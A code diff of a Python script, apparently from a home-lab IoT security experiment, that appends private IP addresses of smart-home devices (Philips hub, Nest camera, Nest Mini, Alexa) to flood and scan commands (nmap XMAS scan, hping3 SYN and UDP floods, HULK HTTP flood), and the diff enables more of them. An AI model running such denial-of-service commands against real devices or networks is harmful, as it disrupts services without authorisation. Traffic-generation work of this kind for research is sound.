@@ -1,21 +1,22 @@
 import subprocess
 import time
+from typing import Tuple
 
 # RUN THIS AS SUDO
 
 # The list of commands that IP Addrs will be appended to
-attackCommands = [
-    # ("python3 HTTPRequest.py ", "HTTP_Request")
-    # ("nmap -sX -p 1-100 ", "XMAS_Flood"),
-    # ("hping3 -S -c 100 -p 443 ", "TCP_SYN_Flood"),
-    # ("hping3 --udp -c 100 -p 53 ", "UDP_Flood"),
-    # ("hping3 -S -c 100 -p 80 ", "HTTP_Flood")
-    ("python3 hulk.py 60 http://", "HULK_HTTP_Flood")
+attackCommands: Tuple[str] = [
+    ("nmap -sX -p 1-100 ", "XMAS_Flood"),
+    ("hping3 -S -c 100 -p 443 ", "TCP_SYN_Flood"),
+    ("hping3 --udp -c 100 -p 53 ", "UDP_Flood"),
+    ("hping3 -S -c 100 -p 80 ", "HTTP_Flood"),
+    ("python3 hulk.py 60 http://", "HULK_HTTP_Flood"),
+    # ("python3 HTTPRequest.py ", "HTTP_Request"),
 
 ]
 
-ipAddrs = [
-    # ("192.168.1.172", "phillipsHub"),     # OK
+ipAddrs: Tuple[str] = [
+    ("192.168.1.172", "phillipsHub"),       # OK
     ("192.168.1.196", "nestCam"),           # OK
     ("192.168.1.112", "googleNestMini"),    # OK
     ("192.168.1.103", "amazonAlexa"),       # OK
